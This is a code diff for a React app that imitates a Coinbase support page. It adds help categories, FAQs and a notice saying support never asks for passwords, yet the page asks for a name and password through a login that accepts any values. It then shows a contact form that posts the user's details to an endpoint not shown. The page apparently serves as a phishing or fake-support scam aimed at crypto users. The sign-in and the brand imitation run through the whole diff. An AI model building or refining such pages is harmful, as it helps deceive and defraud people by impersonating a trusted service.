@@ -11,9 +11,7 @@ function App() {
   const [sent, setSent] = useState(false);
 
   const handleLogin = () => {
-    if (name.trim() && password.trim()) {
-      setLoggedIn(true);
-    }
+    if (name && password) setLoggedIn(true);
   };
 
   const sendEmail = async () => {
@@ -24,26 +22,60 @@ function App() {
       body: JSON.stringify({ name, email, message })
     });
     setSent(true);
-    setEmail("");
-    setMessage("");
     setTimeout(() => setSent(false), 3000);
+    setEmail(""); setMessage("");
   };
+
+  const categories = [
+    { title: "Payments", icon: "💳" },
+    { title: "Account", icon: "👤" },
+    { title: "Security", icon: "🔒" },
+    { title: "Verification", icon: "✅" },
+    { title: "Limits & Fees", icon: "📊" }
+  ];
+
+  const faqs = [
+    "How do I recover my account?",
+    "What is the Coinbase refund policy?",
+    "How do I reset my password?",
+    "How to protect against phishing?"
+  ];
 
   return (
     <div style={wrapper}>
       {!showLogin ? (
-        <div style={heroBox}>
-          <h1 style={{ fontSize: "32px", marginBottom: 10 }}>Need help?</h1>
-          <p style={{ marginBottom: 30, fontSize: "16px", color: "#cbd5e1" }}>
-            We're here to help you with anything related to your Coinbase account.
-          </p>
-          <button style={buttonStyle} onClick={() => setShowLogin(true)}>
-            Sign in to speak with us
-          </button>
-        </div>
+        <>
+          <h1 style={{ fontSize: 32, marginBottom: 10 }}>Find answers to your questions</h1>
+          <p style={{ color: "#cbd5e1", marginBottom: 30 }}>Search help topics or browse categories below.</p>
+
+          <div style={catGrid}>
+            {categories.map((cat, i) => (
+              <div key={i} style={catCard}>
+                <div style={{ fontSize: 32 }}>{cat.icon}</div>
+                <div>{cat.title}</div>
+              </div>
+            ))}
+          </div>
+
+          <div style={policyBox}>
+            <h3>Our support team will never ask for your password or 2-step verification codes.</h3>
+            <p>We’re here to help you stay safe and secure while using Coinbase.</p>
+          </div>
+
+          <div style={faqBox}>
+            <h3>Common questions</h3>
+            <ul style={{ paddingLeft: 0 }}>
+              {faqs.map((q, i) => (
+                <li key={i} style={{ marginBottom: 10, listStyle: "none" }}>🔹 {q}</li>
+              ))}
+            </ul>
+          </div>
+
+          <button style={buttonStyle} onClick={() => setShowLogin(true)}>Sign in to speak with us</button>
+        </>
       ) : !loggedIn ? (
         <div style={box}>
-          <h2 style={{ marginBottom: 20 }}>Log in to Support</h2>
+          <h2>Log in to Support</h2>
           <input style={inputStyle} placeholder="Your name" value={name} onChange={(e) => setName(e.target.value)} />
           <input type="password" style={inputStyle} placeholder="Password" value={password} onChange={(e) => setPassword(e.target.value)} />
           <button style={buttonStyle} onClick={handleLogin}>Log in</button>
@@ -58,7 +90,7 @@ function App() {
           <input style={inputStyle} placeholder="Your email" value={email} onChange={(e) => setEmail(e.target.value)} />
           <textarea rows="4" style={{ ...inputStyle, height: "100px" }} placeholder="Message" value={message} onChange={(e) => setMessage(e.target.value)} />
           <button style={buttonStyle} onClick={sendEmail}>📨 Send Message</button>
-          {sent && <p style={{ color: "lightgreen", marginTop: 10 }}>✅ Message sent!</p>}
+          {sent && <p style={{ color: "lightgreen" }}>✅ Message sent!</p>}
         </div>
       )}
     </div>
@@ -66,62 +98,79 @@ function App() {
 }
 
 const wrapper = {
-  display: 'flex',
-  alignItems: 'center',
-  justifyContent: 'center',
-  minHeight: '100vh',
-  backgroundColor: '#0a0f1c',
-  textAlign: 'center',
-  padding: 20
+  maxWidth: 800,
+  margin: "0 auto",
+  padding: 20,
+  textAlign: "center"
 };
 
-const heroBox = {
-  maxWidth: 500
+const catGrid = {
+  display: "grid",
+  gridTemplateColumns: "repeat(auto-fit, minmax(120px, 1fr))",
+  gap: 20,
+  marginBottom: 40
+};
+
+const catCard = {
+  background: "#1e293b",
+  padding: 20,
+  borderRadius: 10,
+  color: "#f1f5f9",
+  fontWeight: 600,
+  fontSize: 16
 };
 
 const box = {
-  width: '100%',
-  maxWidth: 500,
-  background: '#1e293b',
+  background: "#1e293b",
   padding: 30,
   borderRadius: 12,
-  boxShadow: '0 0 20px rgba(0,0,0,0.3)',
-  textAlign: 'center'
+  textAlign: "center"
+};
+
+const policyBox = {
+  background: "#1e293b",
+  padding: 20,
+  borderRadius: 10,
+  marginBottom: 40,
+  textAlign: "left"
+};
+
+const faqBox = {
+  background: "#0f172a",
+  padding: 20,
+  borderRadius: 10,
+  marginBottom: 40,
+  textAlign: "left"
 };
 
 const inputStyle = {
   width: "100%",
   padding: "12px",
   borderRadius: "8px",
-  border: "1px solid #334155",
   backgroundColor: "#0f172a",
+  border: "1px solid #334155",
   color: "#f8fafc",
-  fontSize: "16px",
-  marginBottom: "10px"
+  marginBottom: "10px",
+  fontSize: "16px"
 };
 
 const buttonStyle = {
-  width: "100%",
-  padding: "12px",
-  borderRadius: "8px",
   backgroundColor: "#3b82f6",
   color: "#fff",
+  padding: "12px 20px",
   border: "none",
-  cursor: "pointer",
+  borderRadius: "8px",
   fontSize: "16px",
-  marginTop: "10px"
+  cursor: "pointer"
 };
 
 const linkButton = {
+  ...buttonStyle,
   display: "block",
-  margin: "20px auto",
-  padding: "12px",
-  borderRadius: "8px",
-  backgroundColor: "#2563eb",
-  color: "#fff",
-  fontWeight: "600",
+  width: "100%",
+  marginTop: "20px",
   textDecoration: "none",
-  width: "100%"
+  textAlign: "center"
 };
 
 ReactDOM.createRoot(document.getElementById("root")).render(<App />);
